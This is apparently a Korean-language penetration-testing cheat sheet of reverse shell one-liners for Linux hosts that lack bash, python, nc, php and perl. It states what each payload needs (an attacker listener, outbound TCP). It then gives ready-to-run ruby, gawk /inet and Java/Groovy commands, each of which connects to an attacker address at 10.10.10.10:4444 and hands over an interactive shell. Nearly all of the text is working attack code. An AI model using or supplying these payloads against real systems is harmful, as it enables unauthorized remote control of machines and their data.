# linux ruby java awk reverse shell

- bash·python·nc·php·perl이 전부 없을 때 쓰는 ruby, gawk /inet, jshell·Groovy 기반 리버스 셸 원라이너 모음
- 타깃에 어떤 인터프리터·도구가 남아 있는지 하나씩 확인하며 존재하는 것 하나로 셸을 열어야 할 때
- 타깃에 ruby 또는 gawk(awk의 /inet는 gawk 전용, mawk에는 없음) 또는 Java 실행 환경 존재, 공격자 리스너 사전 실행과 TCP 아웃바운드 허용 필요

bash·python·nc·php·perl이 전부 없을 때의 대안. 타깃에 있는 것 하나만 있으면 된다.

```bash
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash
# awk — gawk 전용 (/inet 확장은 gawk에만 있고 mawk에는 없음)
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/4444"; while(42) { do{ printf "shell>" | & s; s | & getline c; if(c){ while ((c | & getline) > 0) print $0 | & s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

```java
// jshell·Groovy 콘솔 등 Java 실행 환경에서
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
```
